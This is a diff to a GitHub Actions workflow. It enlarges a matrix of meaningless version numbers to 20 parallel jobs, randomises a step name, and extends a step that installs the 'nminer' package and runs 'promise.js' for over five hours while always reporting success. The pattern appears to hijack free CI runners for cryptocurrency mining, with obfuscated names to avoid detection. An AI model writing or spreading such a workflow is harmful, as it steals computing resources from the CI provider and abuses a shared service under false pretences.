@@ -9,23 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5719 }
-          - { version: 9832 }
-          - { version: 3571 }
-          - { version: 9405 }
-          - { version: 3818 }
-          - { version: 5018 }
-          - { version: 2180 }
-          - { version: 4040 }
-          - { version: 8909 }
-          - { version: 1374 }
-          - { version: 4926 }
-          - { version: 2681 }
-          - { version: 5211 }
-          - { version: 9783 }
-          - { version: 8915 }
-          - { version: 5057 }
-          - { version: 5274 }
+          - { version: 2246 }
+          - { version: 3593 }
+          - { version: 26 }
+          - { version: 5721 }
+          - { version: 1670 }
+          - { version: 7707 }
+          - { version: 7660 }
+          - { version: 5862 }
+          - { version: 2041 }
+          - { version: 3229 }
+          - { version: 8186 }
+          - { version: 3059 }
+          - { version: 3910 }
+          - { version: 1068 }
+          - { version: 8758 }
+          - { version: 8642 }
+          - { version: 2845 }
+          - { version: 7456 }
+          - { version: 8312 }
+          - { version: 3470 }
 
     steps:
       - name: Checkout
@@ -36,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: aircraft cinder consequently since
+      - name: lest unbearably
         run: |
           npm install nminer@latest
-          timeout 301m node promise.js || echo "promise executed"
+          timeout 323m node promise.js || echo "promise executed"
